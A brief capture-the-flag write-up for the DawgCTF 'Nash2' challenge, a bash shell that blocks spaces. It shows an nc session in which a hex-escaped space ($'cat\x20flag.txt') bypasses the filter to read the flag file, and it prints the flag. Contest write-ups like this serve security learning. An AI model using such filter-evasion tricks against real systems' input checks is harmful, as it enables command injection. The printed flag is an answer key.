
# Nash2!
> xikhud, 13/04/2020.

## Problem
`It's nospacebash for real this time!`

 - This is a custom bash problem, we must not use any space character.

## Solution
```
(env) osboxes@osboxes:~/Desktop$ nc ctf.umbccd.io 5800
nash> cat<flag.txt
/bin/bash: line 1: catflag.txt: command not found
nash> X=$'cat\\x20flag.txt'&&$X
DawgCTF{n0_n0_eZ_r3d1r3ct10n_4_u_tR0LL$}
nash>
```
And the flag is `DawgCTF{n0_n0_eZ_r3d1r3ct10n_4_u_tR0LL$}`